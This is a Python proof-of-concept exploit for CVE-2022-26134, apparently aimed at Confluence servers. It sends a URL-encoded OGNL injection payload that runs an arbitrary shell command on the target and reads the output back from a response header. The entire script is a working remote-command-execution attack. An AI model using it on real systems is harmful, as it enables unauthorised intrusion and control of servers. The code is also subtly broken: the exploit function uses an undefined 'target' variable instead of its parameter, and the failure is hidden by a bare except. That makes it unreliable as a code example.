#!/usr/bin/python3

#Proof of concept CVE-2022-26134
import time
import requests
import sys
import argparse

def exploit(host, command):
	payload = f"/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{command}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"

	try:
		req = requests.get(f"{target}{payload}", verify=False, allow_redirects=False)
		time.sleep(2)

		if req.status_code == 302 and 'X-Cmd-Response' in req.headers:
			print(req.headers['X-Cmd-Response'])
		else:
			print("Exploit failed")
			sys.exit()
	except:
		return -1

def main():
	parser = argparse.ArgumentParser(description='CVE-2022-26134')
	parser.add_argument('--url', required=False, help='Target URL with port!')
	parser.add_argument('--command', required=False, help='Command to execute')

	args = parser.parse_args()

	if not args.url:
		print("You must specify target url")

	if not args.command:
		print("You must specify command to execute") 

	target = args.url
	c = args.command

	exploit(target, c)

if __name__ == '__main__':
	main()